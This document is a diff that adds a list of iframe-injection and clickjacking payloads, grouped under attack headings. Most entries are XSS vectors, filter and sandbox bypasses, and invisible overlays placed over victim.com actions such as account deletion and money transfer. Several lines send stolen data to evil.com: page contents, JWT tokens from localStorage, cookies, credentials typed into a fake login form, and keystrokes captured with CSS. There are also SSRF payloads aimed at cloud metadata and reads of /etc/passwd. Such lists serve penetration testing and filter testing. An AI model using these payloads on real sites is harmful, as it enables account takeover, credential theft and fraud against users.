@@ -1,0 +1,247 @@
+# Iframe Injection & Clickjacking Payloads
+# Basic Iframe Injection
+<iframe src="https://evil.com"></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="javascript:alert('XSS')"></iframe>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<iframe src="about:blank" onload="this.contentWindow.document.write('<script>alert(1)</script>')"></iframe>
+<iframe src="//evil.com"></iframe>
+<iframe src="///evil.com"></iframe>
+
+# Iframe with Event Handlers
+<iframe src="x" onload="alert(1)"></iframe>
+<iframe src="x" onerror="alert(1)"></iframe>
+<iframe onload="alert(1)" src="about:blank"></iframe>
+<iframe/onload=alert(1)></iframe>
+<iframe src=x onerror="alert(document.domain)"></iframe>
+
+# Nested Iframes
+<iframe><iframe src="javascript:alert(1)"></iframe></iframe>
+<iframe srcdoc="<iframe src='javascript:alert(1)'></iframe>"></iframe>
+
+# Iframe Sandbox Bypass
+<iframe sandbox="allow-scripts" src="javascript:alert(1)"></iframe>
+<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>alert(1)</script>"></iframe>
+<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,<script>top.location='http://evil.com'</script>"></iframe>
+<iframe sandbox src="data:text/html,<script>alert(1)</script>"></iframe>
+
+# Protocol Handlers
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<iframe src="javascript:parent.document.body.innerHTML='HACKED'"></iframe>
+<iframe src="javascript:window.top.location='http://evil.com'"></iframe>
+<iframe src="data:text/html,<body onload=alert(1)>"></iframe>
+<iframe src="vbscript:msgbox(1)"></iframe>
+<iframe src="about:blank" name="test"></iframe>
+
+# File Protocol
+<iframe src="file:///etc/passwd"></iframe>
+<iframe src="file:///c:/windows/win.ini"></iframe>
+<iframe src="file:///proc/self/environ"></iframe>
+
+# Clickjacking - Basic Overlays
+<iframe src="https://victim.com" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
+<iframe src="https://victim.com/delete-account" style="opacity:0.001;z-index:9999"></iframe>
+<div style="position:relative"><iframe src="https://victim.com/action" style="opacity:0"></iframe><button style="position:absolute;top:0">Click Me!</button></div>
+
+# Clickjacking - Advanced Techniques
+<iframe src="https://victim.com" style="opacity:0;filter:alpha(opacity=0)"></iframe>
+<iframe src="https://victim.com" style="position:absolute;top:-9999px"></iframe>
+<iframe src="https://victim.com" scrolling="no" frameborder="0" style="opacity:0.5"></iframe>
+
+# UI Redressing
+<style>iframe{opacity:0;position:absolute;top:100px;left:100px;}</style><iframe src="https://victim.com/transfer-money"></iframe><button>Win Free iPhone!</button>
+<iframe src="https://victim.com" style="transform:scale(0.1);opacity:0"></iframe>
+
+# Framejacking
+<iframe src="https://victim.com" onload="this.contentWindow.document.body.innerHTML='<h1>Hacked</h1>'"></iframe>
+<iframe src="https://victim.com" name="victim"></iframe><script>frames['victim'].document.write('HACKED')</script>
+
+# Encoded Iframes
+<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"></iframe>
+<iframe src="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>
+<iframe src="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29"></iframe>
+
+# Filter Bypass
+<iframe src="javas%09cript:alert(1)"></iframe>
+<iframe src="javas%0acript:alert(1)"></iframe>
+<iframe src="javas%0dcript:alert(1)"></iframe>
+<iframe src="java%00script:alert(1)"></iframe>
+<iframe/src="javascript:alert(1)"></iframe>
+<iframe/src=javascript:alert(1)></iframe>
+<IFRAME SRC="javascript:alert(1)"></IFRAME>
+<IFrAmE SrC="javascript:alert(1)"></IFrAmE>
+
+# X-Frame-Options Bypass Attempts
+<iframe src="https://victim.com" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+<object data="https://victim.com"></object>
+<embed src="https://victim.com">
+<applet code="https://victim.com"></applet>
+
+# Meta Refresh in Iframe
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"></iframe>
+
+# SVG in Iframe
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
+<iframe src="data:image/svg+xml,<svg onload=alert(1)></svg>"></iframe>
+<iframe src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+'></iframe>
+
+# Form Target Iframe
+<form action="https://victim.com/action" method="POST" target="hiddenFrame"><input name="csrf" value="malicious"></form><iframe name="hiddenFrame" style="display:none"></iframe>
+
+# Cross-Origin Leaks
+<iframe src="https://victim.com" onload="alert(this.contentWindow.location)"></iframe>
+<iframe src="https://victim.com" id="test"></iframe><script>alert(document.getElementById('test').contentDocument)</script>
+
+# Timing Attacks via Iframe
+<iframe src="https://victim.com/admin" onload="console.log('Page loaded in ' + performance.now() + 'ms')"></iframe>
+
+# PDF in Iframe
+<iframe src="https://victim.com/document.pdf#zoom=100"></iframe>
+<iframe src="data:application/pdf;base64,JVBER..."></iframe>
+
+# Srcdoc Advanced
+<iframe srcdoc="<script>window.parent.postMessage('XSS','*')</script>"></iframe>
+<iframe srcdoc="<form action='https://evil.com' method='POST'><input name='data'></form><script>document.forms[0].submit()</script>"></iframe>
+<iframe srcdoc="<style>body{background:url('javascript:alert(1)')}</style>"></iframe>
+
+# Name Attribute Abuse
+<iframe name="alert(1)"></iframe>
+<iframe name="<%=xss%>"></iframe>
+
+# Multiple Iframes
+<iframe src="https://victim.com"></iframe><iframe src="https://victim.com"></iframe><iframe src="https://victim.com"></iframe>
+
+# Iframe Cloaking
+<iframe src="https://victim.com" width="0" height="0" style="display:none"></iframe>
+<iframe src="https://victim.com" width="1" height="1"></iframe>
+<iframe src="https://victim.com" style="visibility:hidden"></iframe>
+
+# Reverse Tabnabbing via Iframe
+<iframe src="https://victim.com" onload="window.opener.location='https://evil.com'"></iframe>
+
+# PostMessage Exploits
+<iframe src="https://victim.com" id="pwn"></iframe><script>document.getElementById('pwn').contentWindow.postMessage('{"admin":true}','*')</script>
+<iframe src="https://victim.com" onload="this.contentWindow.postMessage({cmd:'deleteAccount'},'*')"></iframe>
+
+# WebRTC Leaks via Iframe
+<iframe srcdoc="<script>var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(offer=>pc.setLocalDescription(offer))</script>"></iframe>
+
+# Service Worker via Iframe
+<iframe src="data:text/html,<script>navigator.serviceWorker.register('https://evil.com/sw.js')</script>"></iframe>
+
+# Blob URL in Iframe
+<iframe src="blob:https://victim.com/xxxx-xxxx"></iframe>
+<script>var blob=new Blob(['<script>alert(1)</script>'],{type:'text/html'});var url=URL.createObjectURL(blob);document.write('<iframe src="'+url+'">')</script>
+
+# Data Exfiltration
+<iframe src="https://victim.com/profile" onload="fetch('https://evil.com/?data='+encodeURIComponent(this.contentWindow.document.body.innerHTML))"></iframe>
+
+# Credential Harvesting
+<iframe srcdoc="<form action='https://evil.com/steal' method='POST'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button>Login</button></form>"></iframe>
+
+# DOM Clobbering via Iframe
+<iframe name="x" srcdoc="<a id='x'></a>"></iframe>
+<iframe name="document"></iframe>
+<iframe name="window"></iframe>
+
+# Mutation XSS via Iframe
+<iframe srcdoc="<noscript><p title='</noscript><img src=x onerror=alert(1)>'></noscript>"></iframe>
+
+# CSS Injection in Iframe
+<iframe srcdoc="<style>@import 'https://evil.com/steal.css';</style>"></iframe>
+<iframe srcdoc="<style>body{background:url('https://evil.com/?cookie='+document.cookie)}</style>"></iframe>
+
+# Template Injection in Iframe
+<iframe srcdoc="<script>{{7*7}}</script>"></iframe>
+<iframe srcdoc="<div>{{constructor.constructor('alert(1)')()}}</div>"></iframe>
+
+# Prototype Pollution via Iframe
+<iframe src="https://victim.com/?__proto__[admin]=true"></iframe>
+
+# CORS Bypass via Iframe
+<iframe src="https://victim.com/api/data" onload="console.log(this.contentDocument)"></iframe>
+
+# WebSocket Hijacking
+<iframe srcdoc="<script>var ws=new WebSocket('wss://victim.com/socket');ws.onopen=()=>ws.send('MALICIOUS')</script>"></iframe>
+
+# Mixed Content via Iframe
+<iframe src="http://victim.com" id="mixed"></iframe>
+
+# Dangling Markup via Iframe
+<iframe srcdoc="<img src='https://evil.com/log?data=<form><input name='csrf'"></iframe>
+
+# Open Redirect via Iframe
+<iframe src="https://victim.com/redirect?url=javascript:alert(1)"></iframe>
+<iframe src="https://victim.com/goto?target=//evil.com"></iframe>
+
+# SSRF via Iframe
+<iframe src="https://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/"></iframe>
+<iframe src="https://victim.com/proxy?target=http://localhost:8080/admin"></iframe>
+
+# Path Traversal via Iframe
+<iframe src="https://victim.com/file?path=../../../../etc/passwd"></iframe>
+
+# Race Condition via Multiple Iframes
+<iframe src="https://victim.com/transfer?amount=1000&to=attacker" name="f1"></iframe><iframe src="https://victim.com/transfer?amount=1000&to=attacker" name="f2"></iframe><iframe src="https://victim.com/transfer?amount=1000&to=attacker" name="f3"></iframe>
+
+# Storage Access via Iframe
+<iframe srcdoc="<script>localStorage.setItem('admin','true')</script>"></iframe>
+<iframe srcdoc="<script>alert(localStorage.getItem('token'))</script>"></iframe>
+
+# History Manipulation
+<iframe src="https://victim.com" onload="history.pushState({},'','https://evil.com')"></iframe>
+
+# Service Worker Bypass
+<iframe src="https://victim.com" sandbox="allow-scripts allow-same-origin" srcdoc="<script>navigator.serviceWorker.register('/sw.js')</script>"></iframe>
+
+# Double Encoding
+<iframe src="%252e%252e%252f%252e%252e%252fadmin"></iframe>
+
+# Null Byte Injection
+<iframe src="https://victim.com/page%00.html"></iframe>
+
+# Long URL Attack
+<iframe src="https://victim.com/?param=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"></iframe>
+
+# Fragment Identifier XSS
+<iframe src="https://victim.com#<script>alert(1)</script>"></iframe>
+<iframe src="https://victim.com#' onload='alert(1)"></iframe>
+
+# Meta Injection
+<iframe srcdoc='<meta charset="UTF-7" />+ADw-script+AD4-alert(1)+ADw-/script+AD4-'></iframe>
+
+# CRLF Injection
+<iframe src="https://victim.com/%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK"></iframe>
+
+# Base Tag Hijacking
+<iframe srcdoc="<base href='https://evil.com/'><script src='script.js'></script>"></iframe>
+
+# Session Fixation via Iframe
+<iframe src="https://victim.com/?sessionid=ATTACKER_SESSION"></iframe>
+
+# Cache Poisoning via Iframe
+<iframe src="https://victim.com" onload="fetch('https://victim.com',{cache:'force-cache'})"></iframe>
+
+# JWT Token Theft
+<iframe srcdoc="<script>fetch('https://evil.com/?jwt='+localStorage.getItem('token'))</script>"></iframe>
+
+# WebAuthn Bypass
+<iframe src="https://victim.com/login" sandbox="allow-scripts allow-same-origin"></iframe>
+
+# Permission Prompt Spoofing
+<iframe src="https://victim.com" allow="camera;microphone;geolocation"></iframe>
+
+# Top Frame Navigation
+<iframe srcdoc="<script>top.location='https://evil.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>
+
+# Window.opener Exploit
+<iframe src="https://victim.com" onload="window.open('https://evil.com').opener=window"></iframe>
+
+# CSS Keylogger via Iframe
+<iframe srcdoc="<style>input[value^='a']{background:url('https://evil.com/?char=a')}</style><input>"></iframe>
+
+# Content Spoofing
+<iframe srcdoc="<h1>Your account has been suspended</h1><form action='https://evil.com/phish' method='POST'>...</form>"></iframe>
